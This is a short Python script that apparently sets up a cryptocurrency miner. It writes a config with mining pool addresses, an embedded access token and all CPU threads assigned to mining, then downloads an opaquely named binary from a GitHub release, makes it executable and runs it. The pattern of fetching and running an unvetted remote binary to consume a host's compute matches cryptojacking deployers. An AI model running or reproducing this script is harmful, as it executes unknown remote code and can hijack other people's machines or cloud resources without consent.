import os
import json
import random
import subprocess
import hashlib
import stat
import urllib.request

# === 1. Generate worker name like: $(echo $RANDOM | md5sum | head -c 20)
def generate_worker_name():
    random_number = str(random.randint(0, 999999999)).encode()
    md5_hash = hashlib.md5(random_number).hexdigest()
    return md5_hash[:20]

worker_name = generate_worker_name()
print(f"[+] Generated worker name: {worker_name}")

# === 2. Get total CPU threads using `nproc`
def get_cpu_threads():
    try:
        return int(subprocess.check_output(["nproc"]).decode().strip())
    except Exception as e:
        print(f"[!] Failed to get CPU threads: {e}")
        return 1

cpu_threads = get_cpu_threads()
print(f"[+] Detected CPU Threads: {cpu_threads}")

# === 3. Create JSON config ===
config = {
    "ClientSettings": {
        "poolAddress": "wss://pplnsjetski.xyz/ws/YEFTEEAYTSMKIDPBMGCTIDOZTKCBBGYTGANZMCLGTFWWARKYZGKZZSBBJOQN",
        "alias": worker_name,
        "accessToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImZiZDRlODYyLTkxZWEtNDM1NS04YzFlLTA5Y2M2MmQwNjA2MiIsIk1pbmluZyI6IiIsIm5iZiI6MTc1NTcxMTY2MiwiZXhwIjoxNzg3MjQ3NjYyLCJpYXQiOjE3NTU3MTE2NjIsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.qPA6YWsSenUztyObsghbeePK28zNQ7iY3kazWsk9fJgegbcMo58SLal5Q1ytzPxfaMZIyLhActlzxjBT3G4mwayrzAiyh9IDqXh4CUWNQ54W1LPCzv-uQPuyjy8HNr7qJUFDI-fl54kBXBXGbkCfvghvkX0eP5w1pD0WAmpGTbUmCyead2U3NGDbs2a6DrdRi86uFVp8Pxzg_cwVuFuKFhJx5oVitBCIPPcYSSDz8m9l2C6B1icvwTWGXJnchlOIJ12cjFXpkq_DHhp_M4lWwpMpJGGsl1YKWQ22OrpVheJZM22z-rsgQ4RU3LVbGU1BoY3ssOFmtCnzIE_D5ekATg",
        "pps": True,
        "trainer": {
            "cpu": True,
            "gpu": False,
            "cpuThreads": cpu_threads
        },
        "xmrSettings": {
            "disable": False,
            "enableGpu": False,
            "poolAddress": "139.162.7.93:8089",
            "customParameters": f"-t {cpu_threads}"
        }
    }
}

with open("appsettings.json", "w") as f:
    json.dump(config, f, indent=4)

print("[+] Created appsettings.json")

# === 4. Download kaospa binary ===
kaospa_url = "https://github.com/vedhagsvp/taberas/releases/download/mlb/kaospa"
kaospa_filename = "kaospa"

if not os.path.exists(kaospa_filename):
    print("[+] Downloading kaospa...")
    urllib.request.urlretrieve(kaospa_url, kaospa_filename)
    print("[+] Download complete.")
else:
    print("[!] kaospa already exists. Skipping download.")

# === 5. Make executables
os.chmod(kaospa_filename, os.stat(kaospa_filename).st_mode | stat.S_IEXEC)
os.chmod("appsettings.json", os.stat("appsettings.json").st_mode | stat.S_IEXEC)
print("[+] Set executable permissions.")

# === 6. Run kaospa binary
print("[+] Running ./kaospa ...")
subprocess.run(["./kaospa"])
